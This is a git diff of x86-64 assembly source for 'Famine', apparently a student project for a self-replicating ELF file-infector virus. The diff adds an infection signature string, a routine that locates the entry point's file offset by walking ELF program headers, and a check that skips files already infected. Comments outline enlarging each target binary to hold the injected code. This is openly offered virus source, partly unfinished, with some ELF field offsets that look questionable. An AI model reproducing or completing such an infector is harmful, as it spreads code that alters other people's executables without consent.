@@ -14,6 +14,8 @@ section .text
 params:                                ; filled for infected binaries
     test_param dq 0x0
 
+signature db `Famine version 1.0 (c)oded by <jng>-<gdaryl>`,0
+
 _start:
 
 main:
@@ -420,15 +422,26 @@ infect_single_file:
     cmp qword [rdi], 0
     je  .close_munmap 
 
-    call break
 
     ; iterate the program header, see which segment is the entry point (usually is load segment with RX)
     ; calculate entry point offset (entry vaddr - pheader.vaddr)
+    push rcx
+    call get_entry_offset
+    pop rcx
+    test rax, rax
+    jz .close_munmap
+    
 
     ; go to entry point offset in buffer, check if infected (TODO: calculate offset later)
     ; if infected, close and munmap and return
+    mov rdi, r9
+    mov rsi, rax
+    call check_infected
+    test rax, rax
+    jnz .close_munmap
+    
+    call break
 
-    ; if not infected, close and munmap
 
     ; ftruncate to add 0x1000 (4096) bytes (hardcoded offset here)
     ; mmap the file with new size here
@@ -465,6 +478,86 @@ infect_single_file:
     pop r9
     pop r8
     ret
+
+; rdi - mmaped buffer
+; rsi - entry offset
+; returns 1 if infected and 0 otherwise
+check_infected:
+    add rdi, rsi
+    mov rsi, rdi ; mmap buffer + entry_offset -> rsi
+
+    lea rdi, [rel signature]
+    call strlen
+
+    sub rsi, rax
+    mov rdx, 10 ; just compare 10 bytes only lah
+    call memcmp
+
+    test rax, rax
+    mov rax, 1
+    jz .ret
+
+    mov rax, 0
+    jmp .ret
+
+.ret:
+    ret
+
+; rdi - pointer to entry address (-0x18 is the mmap buffer, +0x28 is pheader table)
+get_entry_offset:
+    push rbx
+    push r8
+ 
+    mov rax, 0
+
+    mov r8, qword [rdi] ; entry addr -> r8
+
+	mov rsi, rdi
+    add rdi, 0x28 ; pheader table addr -> rdi
+    
+    add rsi, 0x20
+    movzx rsi, word [rsi] ; phnum  -> rsi
+    mov rbx, 0
+
+.loop:
+    cmp rbx, rsi
+    je .loop_end
+
+    ; vaddr -> rdx 
+    mov rdx, qword [rdi + 0x10]
+    
+    ; vaddr + size -> rcx
+    mov rcx, qword [rdi + 0x20]
+    add rcx, rdx
+
+    ; cmp  in range? if yes, set rax to pheader offset + remainder and jump to loop end
+    ; if no, continue
+    cmp r8, rdx
+    jl .loop_iter
+
+    cmp r8, rcx
+    jge .loop_iter
+
+    ; TODO: maybe simplify this instruction?
+	; entry_vaddr - vaddr -> r8
+    sub r8, qword [rdi + 0x08]
+    mov rax, qword [rdi + 0x08]
+    add rax, r8
+    
+    jmp .loop_end
+
+.loop_iter:
+    add rbx, 1
+    add rdi, 0x38
+    jmp .loop
+
+.loop_end:
+    
+    pop r8
+    pop rbx
+    ret
+
+
 
 
 
@@ -622,6 +715,11 @@ strstrs:
     pop  rbx
     ret
 
+; rdi - ptr1
+; rsi - ptr2
+; rdx - number of bytes
+; return 0 equal
+; return 1 if not equal
 memcmp:
     xor eax, eax
     test rdx, rdx
